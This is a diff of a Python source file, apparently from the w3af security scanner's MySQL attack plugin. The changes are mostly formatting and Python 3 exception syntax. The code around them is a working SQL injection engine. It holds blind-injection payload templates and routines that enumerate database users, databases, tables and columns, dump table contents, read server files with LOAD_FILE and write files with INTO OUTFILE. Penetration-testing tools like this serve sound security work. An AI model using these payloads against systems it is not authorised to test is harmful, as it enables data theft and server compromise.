@@ -6,14 +6,13 @@ from plugins.attack.db.dbDriver import dbDriver as Common
 
 
 class MySQLMap(Common):
-    __banner                 = ""
-    __currentDb           = ""
-    __fingerprint           = []
-    __cachedDbs           = []
-    __cachedTables         = {}
-    __cachedColumns       = {}
+    __banner = ""
+    __currentDb = ""
+    __fingerprint = []
+    __cachedDbs = []
+    __cachedTables = {}
+    __cachedColumns = {}
     __has_information_schema = False
-
 
     def unescape(self, expression):
         while True:
@@ -25,7 +24,7 @@ class MySQLMap(Common):
             index = expression[firstIndex:].find("'")
 
             if index == -1:
-                raise Exception, "Unenclosed ' in '%s'" % expression
+                raise Exception("Unenclosed ' in '%s'" % expression)
 
             lastIndex = firstIndex + index
             old = "'%s'" % expression[firstIndex:lastIndex]
@@ -42,9 +41,9 @@ class MySQLMap(Common):
 
     def unescape_string(self, a_string):
         ord_list = []
-        
+
         for char in a_string:
-            ord_list.append( str(ord(char)) )
+            ord_list.append(str(ord(char)))
 
         return 'CHAR(' + ','.join(ord_list) + ')'
 
@@ -56,7 +55,7 @@ class MySQLMap(Common):
         elif self.args.injectionMethod == "stringdouble":
             evilStm = '" OR ORD(MID((%s), %d, %d)) > %d AND "1'
         return evilStm
-        
+
     def createExactStm(self):
         if self.args.injectionMethod == "numeric":
             evilStm = " OR MID((%s), %d, %d) = '%s' AND 1=1"
@@ -89,13 +88,13 @@ class MySQLMap(Common):
 
         # MySQL valid versions updated at 02/2007
         versions = (
-                     (32200, 32233),    # MySQL 3.22
-                     (32300, 32354),    # MySQL 3.23
-                     (40000, 40024),    # MySQL 4.0
-                     (40100, 40122),    # MySQL 4.1
-                     (50000, 50032),    # MySQL 5.0
-                     (50100, 50114),    # MySQL 5.1
-                    )
+            (32200, 32233),    # MySQL 3.22
+            (32300, 32354),    # MySQL 3.23
+            (40000, 40024),    # MySQL 4.0
+            (40100, 40122),    # MySQL 4.1
+            (50000, 50032),    # MySQL 5.0
+            (50100, 50114),    # MySQL 5.1
+        )
 
         for element in versions:
             for version in range(element[0], element[1] + 1):
@@ -124,7 +123,6 @@ class MySQLMap(Common):
 
         return None
 
-
     def getFingerprint(self):
         actVer = self.parseFp("MySQL", self.__fingerprint)
 
@@ -151,7 +149,6 @@ class MySQLMap(Common):
 
         return value
 
-
     def getBanner(self):
         logMsg = "fetching banner"
         self.log(logMsg)
@@ -161,13 +158,11 @@ class MySQLMap(Common):
 
         return self.__banner
 
-
     def getCurrentUser(self):
         logMsg = "fetching current user"
         self.log(logMsg)
 
         return self.get_value("current_user()")
-
 
     def getCurrentDb(self):
         logMsg = "fetching current database"
@@ -177,7 +172,6 @@ class MySQLMap(Common):
             return self.__currentDb
         else:
             return self.get_value("database()")
-
 
     def getUsers(self):
         logMsg = "fetching number of database users"
@@ -189,7 +183,7 @@ class MySQLMap(Common):
 
         if not len(count) or count == "0":
             errMsg = "unable to retrieve the number of database users"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         logMsg = "fetching database users"
         self.log(logMsg)
@@ -197,7 +191,7 @@ class MySQLMap(Common):
         users = []
 
         for index in range(int(count)):
-            stm  = "SELECT DISTINCT(user) "
+            stm = "SELECT DISTINCT(user) "
             stm += "FROM mysql.user LIMIT %d, 1" % index
 
             user = self.get_value(stm)
@@ -205,31 +199,30 @@ class MySQLMap(Common):
 
         if not users:
             errMsg = "unable to retrieve the database users"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         return users
-
 
     def getDbs(self):
         logMsg = "fetching number of databases"
         self.log(logMsg)
 
         if not self.__has_information_schema:
-            warnMsg  = "information_schema not available, "
+            warnMsg = "information_schema not available, "
             warnMsg += "remote database is MySQL < 5. database "
             warnMsg += "names will be fetched from 'mysql' table"
             self.warn(warnMsg)
 
             stm = "SELECT COUNT(DISTINCT(db)) FROM mysql.db"
         else:
-            stm  = "SELECT COUNT(DISTINCT(schema_name)) "
+            stm = "SELECT COUNT(DISTINCT(schema_name)) "
             stm += "FROM information_schema.schemata"
 
         count = self.get_value(stm)
 
         if not len(count) or count == "0":
             errMsg = "unable to retrieve the number of databases"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         logMsg = "fetching database names"
         self.log(logMsg)
@@ -238,10 +231,10 @@ class MySQLMap(Common):
 
         for index in range(int(count)):
             if not self.__has_information_schema:
-                stm  = "SELECT DISTINCT(db) "
+                stm = "SELECT DISTINCT(db) "
                 stm += "FROM mysql.db LIMIT %d, 1" % index
             else:
-                stm  = "SELECT DISTINCT(schema_name) "
+                stm = "SELECT DISTINCT(schema_name) "
                 stm += "FROM information_schema.schemata "
                 stm += "LIMIT %d, 1" % index
 
@@ -252,16 +245,15 @@ class MySQLMap(Common):
             self.__cachedDbs = dbs
         else:
             errMsg = "unable to retrieve the database names"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         return dbs
 
-
     def getTables(self):
         if not self.__has_information_schema:
-            errMsg  = "information_schema not available, "
+            errMsg = "information_schema not available, "
             errMsg += "remote database is MySQL < 5.0"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         if not self.args.db:
             if not len(self.__cachedDbs):
@@ -280,14 +272,14 @@ class MySQLMap(Common):
             logMsg = "fetching number of tables for database '%s'" % db
             self.log(logMsg)
 
-            stm  = "SELECT COUNT(DISTINCT(table_name)) "
+            stm = "SELECT COUNT(DISTINCT(table_name)) "
             stm += "FROM information_schema.tables "
             stm += "WHERE table_schema LIKE '%s'" % db
 
             count = self.get_value(stm)
 
             if not len(count) or count == "0":
-                warnMsg  = "unable to retrieve the number of "
+                warnMsg = "unable to retrieve the number of "
                 warnMsg += "tables for database '%s'" % db
                 self.warn(warnMsg)
 
@@ -299,7 +291,7 @@ class MySQLMap(Common):
             tables = []
 
             for index in range(int(count)):
-                stm  = "SELECT DISTINCT(table_name) "
+                stm = "SELECT DISTINCT(table_name) "
                 stm += "FROM information_schema.tables "
                 stm += "WHERE table_schema LIKE '%s' " % db
                 stm += "LIMIT %d, 1" % index
@@ -310,28 +302,27 @@ class MySQLMap(Common):
             if tables:
                 dbTables[db] = tables
             else:
-                warnMsg  = "unable to retrieve the tables "
+                warnMsg = "unable to retrieve the tables "
                 warnMsg += "for database '%s'" % db
                 self.warn(warnMsg)
 
         if dbTables:
             self.__cachedTables = dbTables
         elif not self.args.db:
-            errMsg  = "unable to retrieve the tables for any database"
-            raise Exception, errMsg
+            errMsg = "unable to retrieve the tables for any database"
+            raise Exception(errMsg)
 
         return dbTables
-
 
     def getColumns(self):
         if not self.args.tbl:
             errMsg = "missing table parameter"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         if not self.__has_information_schema:
-            errMsg  = "information_schema not available, "
+            errMsg = "information_schema not available, "
             errMsg += "remote database is MySQL < 5.0"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         if "." in self.args.tbl:
             self.args.db, self.args.tbl = self.args.tbl.split(".")
@@ -341,7 +332,7 @@ class MySQLMap(Common):
             logMsg += " on database '%s'" % self.args.db
         self.log(logMsg)
 
-        stm  = "SELECT COUNT(DISTINCT(column_name)) "
+        stm = "SELECT COUNT(DISTINCT(column_name)) "
         stm += "FROM information_schema.columns "
         stm += "WHERE table_name LIKE '%s' " % self.args.tbl
         if self.args.db:
@@ -350,11 +341,11 @@ class MySQLMap(Common):
         count = self.get_value(stm)
 
         if not len(count) or count == "0":
-            errMsg  = "unable to retrieve the number of columns "
+            errMsg = "unable to retrieve the number of columns "
             errMsg += "for table '%s'" % self.args.tbl
             if self.args.db:
                 errMsg += " on database '%s'" % self.args.db
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         logMsg = "fetching columns for table '%s'" % self.args.tbl
         if self.args.db:
@@ -366,7 +357,7 @@ class MySQLMap(Common):
         columns = {}
 
         for index in range(int(count)):
-            stm  = "SELECT DISTINCT(column_name) "
+            stm = "SELECT DISTINCT(column_name) "
             stm += "FROM information_schema.columns "
             stm += "WHERE table_name LIKE '%s' " % self.args.tbl
             if self.args.db:
@@ -375,7 +366,7 @@ class MySQLMap(Common):
 
             column = self.get_value(stm)
 
-            stm  = "SELECT data_type "
+            stm = "SELECT data_type "
             stm += "FROM information_schema.columns "
             stm += "WHERE table_name LIKE '%s' " % self.args.tbl
             stm += "AND column_name LIKE '%s'" % column
@@ -389,30 +380,29 @@ class MySQLMap(Common):
             table[self.args.tbl] = columns
             tableColumns[self.args.db] = table
         else:
-            errMsg  = "unable to retrieve the columns for "
+            errMsg = "unable to retrieve the columns for "
             errMsg += "table '%s'" % self.args.tbl
             if self.args.db:
                 errMsg += " on database '%s'" % self.args.db
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         self.__cachedColumns[self.args.db] = table
 
         return tableColumns
 
-
     def dumpTable(self):
         if not self.args.tbl:
-            raise Exception, "missing table parameter"
+            raise Exception("missing table parameter")
 
         if not self.__has_information_schema:
-            errMsg  = "information_schema not available, "
+            errMsg = "information_schema not available, "
             errMsg += "remote database is MySQL < 5.0"
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         if not self.__cachedColumns:
             self.__cachedColumns = self.getColumns()
 
-        logMsg  = "fetching number of entries for "
+        logMsg = "fetching number of entries for "
         logMsg += "table '%s'" % self.args.tbl
         if self.args.db:
             logMsg += "on database '%s'" % self.args.db
@@ -426,11 +416,11 @@ class MySQLMap(Common):
         count = self.get_value(stm)
 
         if not len(count) or count == "0":
-            errMsg  = "unable to retrieve the number of entries "
+            errMsg = "unable to retrieve the number of entries "
             errMsg += "for table '%s'" % self.args.tbl
             if self.args.db:
                 errMsg += " on database '%s'" % self.args.db
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         if self.args.col:
             self.args.col = self.args.col.split(',')
@@ -441,7 +431,7 @@ class MySQLMap(Common):
             if self.args.col and column not in self.args.col:
                 continue
 
-            logMsg  = "fetching entries of column '%s' for " % column
+            logMsg = "fetching entries of column '%s' for " % column
             logMsg += "table '%s'" % self.args.tbl
             if self.args.db:
                 logMsg += " on database '%s'" % self.args.db
@@ -453,7 +443,7 @@ class MySQLMap(Common):
             columnValues[column] = {}
 
             for index in range(int(count)):
-                stm  = "SELECT %s FROM %s " % (column, fromExpr)
+                stm = "SELECT %s FROM %s " % (column, fromExpr)
                 stm += "LIMIT %d, 1" % index
                 value = self.get_value(stm)
 
@@ -480,14 +470,13 @@ class MySQLMap(Common):
 
             columnValues["__infos__"] = infos
         else:
-            errMsg  = "unable to retrieve the entries for "
+            errMsg = "unable to retrieve the entries for "
             errMsg += "table '%s'" % self.args.tbl
             if self.args.db:
                 errMsg += " on database '%s'" % self.args.db
-            raise Exception, errMsg
+            raise Exception(errMsg)
 
         return columnValues
-
 
     def getFile(self, filename):
         logMsg = "fetching file: '%s'" % filename
@@ -498,23 +487,23 @@ class MySQLMap(Common):
         else:
             return self.get_value("SELECT LOAD_FILE('%s')" % filename)
 
-    def writeFile( self, filename, content ):
-        self.log('Writing %s with content: %s' % (filename,content) )
-        
+    def writeFile(self, filename, content):
+        self.log('Writing %s with content: %s' % (filename, content))
+
         union = self.unionCheck()
         # union = http://localhost/w3af/blind_sqli/blind_sqli-integer.php?id=1 UNION SELECT NULL, NULL, NULL, NULL, NULL
         if union is None:
             raise Exception('Failed to find a valid SQL UNION.')
-        
+
         if self.args.injectionMethod == "numeric":
             union += ' FROM mysql.user LIMIT 1 INTO OUTFILE \'%s\' %%23' % filename
         elif self.args.injectionMethod == "stringsingle":
-            union = union.replace( "'1", 'NULL', 1 )
+            union = union.replace("'1", 'NULL', 1)
             union += ' FROM mysql.user LIMIT 1 INTO OUTFILE \'%s\' %%23' % filename
         elif self.args.injectionMethod == "stringdouble":
-            union = union.replace( '"1', 'NULL', 1 )
+            union = union.replace('"1', 'NULL', 1)
             union += ' FROM mysql.user LIMIT 1 INTO OUTFILE "%s" %%23' % filename
-        
+
         # Now I'll basically create a list of union statements that are going to be sent to the
         # remote server. I create a list, because I REALLY WANT TO WRITE THE FILE, but I
         # don't know which of the "NULLs" that I'm injecting will be correctly casted to the
@@ -522,31 +511,31 @@ class MySQLMap(Common):
         union_list = []
         number_of_nulls = union.count('NULL')
         union = union.replace('NULL', '%s')
-        
-        format_string_data = [ 'NULL' for i in xrange(number_of_nulls) ]
-        
+
+        format_string_data = ['NULL' for i in xrange(number_of_nulls)]
+
         # Do some content mangling... and convert to CHAR(....)
-        content = self.unescape_string( content )
-        
+        content = self.unescape_string(content)
+
         for position in xrange(number_of_nulls):
             tmp_format_string_data = format_string_data[:]
             tmp_format_string_data[position] = content
-            
+
             crafted_union = union
             for string_format in xrange(union.count('%s')):
-                crafted_union = crafted_union.replace('%s', tmp_format_string_data[string_format], 1)
-            union_list.append( crafted_union )
+                crafted_union = crafted_union.replace(
+                    '%s', tmp_format_string_data[string_format], 1)
+            union_list.append(crafted_union)
 
         for union in union_list:
-            self.log( 'Using UNION: ' + union )
-            self.getPage( union )
-        
+            self.log('Using UNION: ' + union)
+            self.getPage(union)
+
     def getExpr(self, expression):
         if self.args.unionUse:
             return self.unionUse(expression)
         else:
             return self.get_value(expression)
-
 
     def checkDbms(self):
         logMsg = "testing MySQL"
@@ -567,7 +556,7 @@ class MySQLMap(Common):
 
                 return False
 
-            stm  = "SELECT %s " % randInt
+            stm = "SELECT %s " % randInt
             stm += "FROM information_schema.tables "
             stm += "LIMIT 0, 1"
 
@@ -582,7 +571,7 @@ class MySQLMap(Common):
                 if self.__currentDb == self.get_value("SCHEMA()"):
                     self.__fingerprint = [">= 5.0.2", "< 5.1"]
 
-                    stm  = "SELECT %s " % randInt
+                    stm = "SELECT %s " % randInt
                     stm += "FROM information_schema.partitions "
                     stm += "LIMIT 0, 1"
 
@@ -661,18 +650,17 @@ class MySQLMap(Common):
             if i > 2:
                 for element in resultDict.values():
                     if element[0] == 1:
-                        
+
                         if self.args.httpMethod == "GET":
                             value = baseUrl
                             return value
-                        
+
                         elif self.args.httpMethod == "POST":
                             url = baseUrl.split("?")[0]
                             data = baseUrl.split("?")[1]
                             value = "url:\t'%s'" % url
                             value += "\ndata:\t'%s'\n" % data
                             return value
-    
-    def __init__(self, urlOpener, cmpFunction, vuln):
-        Common.__init__( self, urlOpener, cmpFunction, vuln )
 
+    def __init__(self, urlOpener, cmpFunction, vuln):
+        Common.__init__(self, urlOpener, cmpFunction, vuln)
